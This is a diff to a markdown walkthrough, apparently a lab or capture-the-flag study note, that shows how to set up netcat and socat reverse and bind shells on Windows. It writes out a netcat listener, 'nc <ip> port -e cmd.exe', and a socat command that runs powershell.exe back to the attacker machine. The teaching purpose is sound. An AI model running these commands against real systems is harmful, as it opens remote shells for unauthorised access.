@@ -14,11 +14,14 @@ The one that we created in the prev task was a webshell :0
 
 Open the cmd using the administrators permissions now simply type the command :
 
-    nc <ip> port
+    nc <ip> port -e "cmd.exe"
+
+Before doing so make sure to open the listner in your own machine using `nc -lnvp <port>`
 
 There we go..
 
-![image](https://github.com/Theincognitomode/What-the-shell/assets/73027020/a1bdf8bc-e6dc-445b-ac92-35f155d05290)
+
+![Screenshot 2023-11-18 135745](https://github.com/Theincognitomode/What-the-shell/assets/73027020/36fdbb08-7baa-4453-b088-03b523f62739)
 
 
 This is a NETCAT reverse shell..
@@ -26,12 +29,13 @@ This is a NETCAT reverse shell..
 
 Now lets create a **Bind shell**
 
-![image](https://github.com/Theincognitomode/What-the-shell/assets/73027020/6ec413c7-24fb-4581-9335-c7fc2209abaa)
+![Screenshot 2023-11-18 140805](https://github.com/Theincognitomode/What-the-shell/assets/73027020/5a439b6e-c16b-45e2-9c5a-5564b9022c0f)
 
 
 Now you can see the difference 
 
 # SOCAT
+
 
 - Socat rev-shell 
 We will be using this command for listner :(in our machine)
@@ -42,7 +46,11 @@ Go to windows and execute this command:
 
     socat TCP:<LOCAL IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
 
-![image](https://github.com/Theincognitomode/What-the-shell/assets/73027020/4d711919-d314-49cd-90c9-444d5a7ed072)
+![Screenshot 2023-11-18 142047](https://github.com/Theincognitomode/What-the-shell/assets/73027020/fc6aadc5-8fa7-4438-af13-3d9dfdb31e85)
+
+
+
+
 
 There we gooo!!
 
@@ -54,8 +62,9 @@ There we gooo!!
 
 2. In your machine
 
-       socat TCP:<LOCAL IP>:<LOCAL-PORT>
-       
-![image](https://github.com/Theincognitomode/What-the-shell/assets/73027020/0304dc7e-e064-4797-ad2b-dd61622f907b)
+       socat TCP:<LOCAL IP>:<LOCAL-PORT> -
+
+
+![Screenshot 2023-11-18 142818](https://github.com/Theincognitomode/What-the-shell/assets/73027020/2ef37e89-da21-42d0-bf68-13a454a5f17a)
 
 
